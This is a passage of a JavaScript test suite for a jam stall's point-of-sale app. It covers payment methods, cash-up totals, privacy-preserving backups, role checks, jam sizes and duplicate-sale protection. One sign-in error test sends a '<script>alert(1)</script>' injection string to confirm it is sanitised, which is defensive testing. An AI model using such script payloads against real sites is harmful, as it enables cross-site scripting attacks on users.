  const sell = (paid, id) => SF.dispatch('sell', { token: tok, opId: id, marketId: 'M01', paid, lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(sell('card', 's1').ok, true);
  assert.strictEqual(sell('eft', 's2').ok, true);
  assert.strictEqual(sell(undefined, 's3').ok, true);
  assert.strictEqual(sell('bitcoin', 's4').ok, true);
  assert.strictEqual(JSON.stringify(SF.orders().map((o) => o.paid)), JSON.stringify(['card', 'eft', 'cash', 'cash']));
  const d = SF.dispatch('dashboard', { token: tok }).data;
  assert.strictEqual(JSON.stringify(d.summary.byMethod), JSON.stringify({ cash: 140, card: 70, eft: 70 }));
});

test('a pre-order paid by card is recorded as card', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  const no = order(SF).orderNo;
  assert.strictEqual(SF.dispatch('markPaid', { token: tok, opId: 'p1', orderNo: no, paid: 'card' }).ok, true);
  assert.strictEqual(SF.findOrder(no).paid, 'card');
});

test('the cash-up only expects the cash in the tin, not card or EFT', () => {
  const { SF } = shop(day(3));
  SF.setPluginEnabled ? SF.setPluginEnabled('cashup', true) : SF.set('plugins', JSON.stringify(['cashup']));
  const tok = ownerTok(SF);
  SF.dispatch('sell', { token: tok, opId: 'a', marketId: 'M01', paid: 'cash', lines: [{ id: 'P01', qty: 2 }] });
  SF.dispatch('sell', { token: tok, opId: 'b', marketId: 'M01', paid: 'card', lines: [{ id: 'P01', qty: 1 }] });
  const exp = SF.dispatch('cashup.expected', { token: tok, opId: 'c' });
  const e = exp.data || exp;
  assert.strictEqual(e.cash, 140, JSON.stringify(e));
  assert.strictEqual(e.other, 70);
  const rec = SF.dispatch('cashup.record', { token: tok, opId: 'r', counted: 140 + e.float });
  assert.strictEqual(rec.ok, true, rec.message);
  assert.strictEqual(rec.expected, 140 + e.float, 'card money is not expected in the tin, only cash and the float');
});

/* ---------- weekly backup ---------- */
test('a backup copies every tab, but no customer names or phone numbers', () => {
  const { SF, created } = shop(day(3));
  const tok = ownerTok(SF);
  order(SF, { name: 'Anna Bester', phone: '082 555 0101' });
  SF.dispatch('sell', { token: tok, opId: 't', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  const r = SF.dispatch('backupNow', { token: tok }).data;
  assert.strictEqual(r.ok, true);
  const b = created[0];
  assert.ok(!b.tabs.Sheet1, 'the empty first tab is gone');
  for (const t of ['Products', 'Orders', 'Movements', 'Markets']) assert.ok(b.tabs[t], t + ' copied');
  const text = JSON.stringify(b.tabs.Orders.rows);
  assert.ok(text.indexOf('Anna') === -1 && text.indexOf('082 555') === -1, 'customer details left out: ' + text);
  assert.ok(text.indexOf('Walk-up') !== -1, 'till sales keep their Walk-up name');
  assert.strictEqual(b.tabs.Products.rows[1][1], 'Apricot Jam');
  assert.strictEqual(SF.dispatch('health', { token: tok }).data.backup.url, r.url);
});

test('the weekly backup runs once a week, and only for an owner or manager', () => {
  const { SF, created } = shop(day(3));
  const tok = ownerTok(SF);
  assert.strictEqual(SF.dispatch('autoBackup', { token: tok }).data.ok, true);
  assert.strictEqual(created.length, 1, 'the first one runs');
  assert.strictEqual(SF.dispatch('autoBackup', { token: tok }).data.skipped, true);
  assert.strictEqual(created.length, 1, 'not again the same week');
  SF.set('lastBackup', JSON.stringify({ at: new Date(Date.now() - 8 * 864e5).toISOString() }));
  SF.set('backupStarted', 0);
  SF.dispatch('autoBackup', { token: tok });
  assert.strictEqual(created.length, 2, 'due again after a week');
  SF.setPin('cashier', '1111');
  const c = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  assert.strictEqual(SF.dispatch('backupNow', { token: c }).code, 'forbidden');
});


/* ---------- sign-in problems: what phones report, and what is never kept ---------- */
test('a sign-in problem report keeps only a stage and a short code, never anything else', () => {
  const { SF, sheets } = shop(day(3));
  const r = SF.dispatch('authError', { stage: 'render', code: 'no-button <script>alert(1)</script> jane@x.com', browser: 'Chrome-Android!!', device: 'abc 123' });
  assert.strictEqual(r.data.ok, true);
  SF.dispatch('authError', { stage: 'load', code: 'blocked', browser: 'chrome-android-app', device: 'abc 123' });
  assert.strictEqual(SF.dispatch('authError', { stage: 'hack', code: 'x' }).data.ok, false, 'an unknown stage is refused');
  const rows = sheets.Audit.rows.filter((x) => x[4] === 'authError');
  assert.strictEqual(rows.length, 2);
  assert.strictEqual(rows[0][6], 'other · other', 'free text is filed as other: ' + rows[0][6]);
  assert.strictEqual(rows[1][6], 'blocked · chrome-android-app');
  assert.ok(!/jane|@|<|script/.test(rows.map((x) => x[5] + ' ' + x[6]).join(' | ')), 'stage and detail are clean');
});

test('no more than 40 sign-in problem reports are kept in an hour', () => {
  const { SF, sheets } = shop(day(3));
  for (let i = 0; i < 60; i++) SF.dispatch('authError', { stage: 'load', code: 'blocked' });
  assert.strictEqual(sheets.Audit.rows.filter((x) => x[4] === 'authError').length, 40);
});

test('Health lists recent sign-in problems for the owner', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  SF.dispatch('authError', { stage: 'network', code: 'unreachable', browser: 'safari-ios' });
  const h = SF.dispatch('health', { token: tok }).data;
  assert.strictEqual(h.signInProblems.length, 1);
  assert.strictEqual(h.signInProblems[0].stage, 'network');
  assert.ok(/unreachable/.test(h.signInProblems[0].detail));
});


/* ---------- every jam in all three sizes ---------- */
const jamStall = () => {
  const env = shop(day(3));
  const { SF } = env;
  const ctx = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(
    fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), ctx));
  SF.pots = () => ctx.sfPots(); SF.newPot = (n) => ctx.sfNewPot(n);
  SF.missingSizes = () => ctx.sfMissingSizes(); SF.addJamSizes = () => ctx.sfAddJamSizes();
  return Object.assign(env, { ctx });
};

test('the stocktake puts every jam on the list in all three sizes, and stock only where it was counted', () => {
  const { SF, ctx } = jamStall();
  ctx.sfApplyStocktake();
  const ps = SF.products();
  const jams = ctx.STOCKTAKE.jams.map((j) => j[0]);
  jams.forEach((n) => ['352 ml', 'Medium (odd bottle)', '125 ml'].forEach((v) => {
    assert.ok(ps.find((p) => p.name === n && p.variant === v), n + ' ' + v + ' is on the list');
  }));
  const apricot = (v) => ps.find((p) => p.name === 'Apricot' && p.variant === v);
  assert.ok(ps.find((p) => p.name === 'Pineapple / Granadilla' && p.variant === '125 ml'), 'the small Pineapple / Granadilla jar is on the list');
  assert.strictEqual(apricot('Medium (odd bottle)').onHand, 0, 'a size never counted starts at none');
  assert.strictEqual(apricot('Medium (odd bottle)').price, 50);
  assert.strictEqual(apricot('125 ml').onHand, 1, 'counted stock is kept');
  assert.strictEqual(ps.find((p) => p.name === 'Strawberry Gin' && p.variant === 'Medium (odd bottle)').price, 60, 'a premium jam gets the premium price in a new size');
  assert.strictEqual(ps.find((p) => p.name === 'Fig Chunky' && p.variant === '125 ml').price, 50);
  assert.ok(apricot('Medium (odd bottle)').cost > 0, 'and its cost is worked out');
});

test('Add the missing sizes adds only what is missing and never touches stock or prices already there', () => {
  const { SF, ctx } = jamStall();
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  // A live sheet as it is today: one jam, in one size, at her own price, with stock.
  SF.append('products', { ProductId: 'P50', Name: 'Apricot', Variant: '352 ml', Type: 'stocked', Category: 'Jams', Unit: 'each', Price: 72, Active: 'Yes', Sort: 5 });
  SF.move('P50', 2, 'adjust', 'count');
  SF.append('products', { ProductId: 'P51', Name: 'Mulberry', Variant: '125 ml', Type: 'stocked', Category: 'Jams', Unit: 'each', Price: 45, Active: 'No', Sort: 6 });
  const before = SF.dispatch('stock', { token: tok }).data.sizesMissing;
  assert.strictEqual(before, ctx.STOCKTAKE.jams.length * 3 - 2, 'every size but the two there is missing');
  const r = SF.dispatch('addJamSizes', { token: tok, opId: 'ads1' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.added, before);
  const ps = SF.products({ all: true });
  assert.strictEqual(ps.filter((p) => p.name === 'Apricot').length, 3);
  const keep = ps.find((p) => p.id === 'P50');
  assert.strictEqual(keep.price, 72, 'her price is untouched'); assert.strictEqual(keep.onHand, 2, 'her stock is untouched');
  assert.strictEqual(ps.find((p) => p.id === 'P51').active, false, 'a size she switched off stays off');
  assert.strictEqual(ps.filter((p) => p.name === 'Mulberry').length, 3, 'and is not added a second time');
  const added = ps.find((p) => p.name === 'Apricot' && p.variant === 'Medium (odd bottle)');
  assert.strictEqual(added.onHand, 0); assert.strictEqual(added.price, 50); assert.strictEqual(added.active, true);
  assert.strictEqual(SF.dispatch('stock', { token: tok }).data.sizesMissing, 0);
  const again = SF.dispatch('addJamSizes', { token: tok, opId: 'ads2' });
  assert.strictEqual(again.added, 0, 'running it again adds nothing');
  // cooking offers all three sizes, ready to fill in
  const pot = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Apricot');
  assert.strictEqual(pot.sizes.length, 3);
});

test('only someone who may change stock can add the sizes', () => {
  const { SF } = jamStall();
  SF.setPin('viewer', '2222');
  const v = SF.dispatch('signIn', { pin: '2222', device: 'v' }).data.token;
  assert.strictEqual(SF.dispatch('addJamSizes', { token: v, opId: 'x' }).code, 'forbidden');
});

/* ---------- updates must never cost a sale ---------- */
test('a server too busy to take a sale says "send it again" (retry), and does nothing', () => {
  const env = shop(day(3));
  const { SF } = env;
  const tok = ownerTok(SF);
  env.ctx.__busy = true;
  const r = SF.dispatch('sell', { token: tok, opId: 'busy1', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(r.ok, false); assert.strictEqual(r.retry, true);
  assert.strictEqual(SF.orders().length, 0, 'nothing was sold');
  env.ctx.__busy = false;
  const again = SF.dispatch('sell', { token: tok, opId: 'busy1', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(again.ok, true);
  assert.strictEqual(SF.orders().length, 1, 'sent again, sold once');
});

test('the same sale sent twice (the first reply was lost) is sold once', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  const sale = () => SF.dispatch('sell', { token: tok, opId: 'same1', marketId: 'M01', paid: 'card', lines: [{ id: 'P01', qty: 2 }] });
  const a = sale(), b = sale();
  assert.strictEqual(a.ok, true); assert.strictEqual(b.ok, true); assert.strictEqual(b.replayed, true);
  assert.strictEqual(SF.orders().length, 1);
  assert.strictEqual(SF.onHand().P01, 8, 'the stock went down once');
});

console.log(failures ? '\n' + failures + ' failed' : '\nall passed');
process.exit(failures ? 1 : 0);
